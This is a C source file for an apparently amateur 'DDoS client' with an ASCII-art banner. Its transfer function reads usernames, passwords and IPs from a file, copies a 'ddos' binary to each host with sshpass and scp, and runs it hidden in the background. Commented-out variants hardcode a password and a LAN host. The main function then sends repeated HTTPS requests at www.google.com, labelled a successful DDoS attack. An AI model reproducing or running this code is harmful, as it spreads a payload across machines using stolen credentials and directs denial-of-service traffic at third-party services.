#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <curl/curl.h>

void displayTextArt() {
  printf(R"EOF(

▓█████▄ ▓█████▄  ▒█████    ██████     ▄████▄   ██▓     ██▓▓█████  ███▄    █ ▄▄▄█████▓
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒██▀ ▀█  ▓██▒    ▓██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒▓█    ▄ ▒██░    ▒██▒▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ▒▓▓▄ ▄██▒▒██░    ░██░▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   ▒ ▓███▀ ░░██████▒░██░░▒████▒▒██░   ▓██░  ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░░ ▒░▓  ░░▓  ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ░  ▒   ░ ░ ▒  ░ ▒ ░ ░ ░  ░░ ░░   ░ ▒░    ░    
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░          ░ ░    ▒ ░   ░      ░   ░ ░   ░      
   ░       ░        ░ ░        ░     ░ ░          ░  ░ ░     ░  ░         ░          
 ░       ░                           ░                                               



)EOF");
}

/*
void transfer(void){
    const char *local_path = "/root/Bureau/ddos";
    const char *remote_path = "cyrille@192.168.1.30:/tmp/";
    const char *scp_command = "scp -P 22 %s %s";
    const char *remote_command = "sshpass -p Azerty123 ssh -p 22 -f cyrille@192.168.1.30 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'";


    char command[512];
    snprintf(command, sizeof(command), scp_command, local_path, remote_path);

    system(command);

    int result = system(remote_command);
    if (result == -1) {
        printf("Error with the execution of the remote command.\n");
    }
}
*/
/*
void transfer(void){
    const char *local_path = "/root/Bureau/ddos";
    const char *remote_path = "cyrille@192.168.1.30:/tmp/";
    const char *scp_command = "scp -P 22 %s %s";
    char remote_command[512]; 

    snprintf(remote_command, sizeof(remote_command), "sshpass -p Azerty123 ssh -p 22 -f cyrille@192.168.1.30 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'");

    char command[512];
    snprintf(command, sizeof(command), scp_command, local_path, remote_path);

    system(command);

    int result = system(remote_command);
    if (result == -1) {
        printf("Error with the execution of the remote command.\n");
    }

   
    snprintf(remote_command, sizeof(remote_command), "sshpass -p Azerty123 ssh -p 22 -f chris@192.168.1.30 'cd /tmp && nohup ./ddos > /dev/null 2>&1'");
    
   
    int result2 = system(remote_command);
    if (result2 == -1) {
        printf("Error with the execution of the second remote command.\n");
    }
}
*/
/*
void transfer() {
    FILE *file = fopen("/root/Bureau/connexion", "r");
    if (file == NULL) {
        perror("Failed to open the info file");
        return;
    }

    char line[256];
    char processed_ips[256] = ""; // Liste des IP déjà traitées

    while (fgets(line, sizeof(line), file) != NULL) {
        char user[64];
        char password[64];
        char ip[64];

        if (sscanf(line, "%[^;];%[^;];%s", user, password, ip) == 3) {
        
            if (strstr(processed_ips, ip) != NULL) {
                continue; // Ignorer IP si elle a déjà été traitée
            }

           
            snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s", ip);

           
            char scp_command[256];
            snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P 22 /root/Bureau/ddos %s@%s:/tmp/", password, user, ip);
            printf("La commande créée est : %s\n", scp_command); // Afficher la commande
            system(scp_command);

          
            char ssh_command[256];
            snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
            printf("La commande créée est : %s\n", ssh_command); // Afficher la commande
            system(ssh_command);
        }
    }

    fclose(file);
} 
*/

void transfer() {
    FILE *file = fopen("/root/Bureau/connexion", "r");
    if (file == NULL) {
        perror("Failed to open the info file");
        return;
    }

    char line[256];
    char processed_ips[256] = ""; // Lists of ip checked
    int chmod_executed = 0;  // flag for check if chmod already executed

    while (fgets(line, sizeof(line), file) != NULL) {
        char user[64];
        char password[64];
        char ip[64];

        if (sscanf(line, "%[^;];%[^;];%s", user, password, ip) == 3) {
            // Check if ip as already used for scp
            if (strstr(processed_ips, ip) == NULL) {
                // IP not already used = do scp
                snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s", ip);
                
                // Transfer file using scp with 
                char scp_command[256];
                snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P 22 /root/Bureau/ddos %s@%s:/tmp/", password, user, ip);
                printf("La commande créée est : %s\n", scp_command); // show the curent command
                system(scp_command);
            }
            
            // SSH connection to the user on the specified IP
            char ssh_command[256];
            if (chmod_executed) {
                // if chmod executed = execute without chmod
                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
            } else {
                // if chmod not executed = execute with chmod
                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
                chmod_executed = 1;
            }

            printf("La commande créée est : %s\n", ssh_command); // show current command
            system(ssh_command);
        }
    }

    fclose(file);
}

void ddos(const char *hostname, int index, int total) {
    CURL *curl = curl_easy_init();
    CURLcode resolution;

    if (curl) {
        char url[256];
        snprintf(url, sizeof(url), "https://%s", hostname);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PORT, 443);

        freopen("/dev/null", "w", stdout); //don't show the get result
        resolution = curl_easy_perform(curl);
        freopen("/dev/tty", "w", stdout); // restablished the standard output

        if (resolution != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
        }
        else {
            printf("DDoS attack on %s was successful.\n", hostname);
        }

        curl_easy_cleanup(curl);
    }
    printf("[%d/%d] Progress: %d%%\r", index, total, (index * 100) / total);
    fflush(stdout);
}

int main(void) {

    transfer();
    struct addrinfo hints;
    struct addrinfo *result;

    const char *hostname = "www.google.com";

    displayTextArt();

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int exists = getaddrinfo(hostname, NULL, &hints, &result);

    if (exists == 0) {
        printf("DNS exists.\n");
        freeaddrinfo(result);

        int Calls = 10;
        for (int i = 1; i <= Calls; i++) {
            ddos(hostname, i, Calls);
        }

    } 
    
    else {
        printf("DNS doesn't exist or may have a problem\n");
    }

}
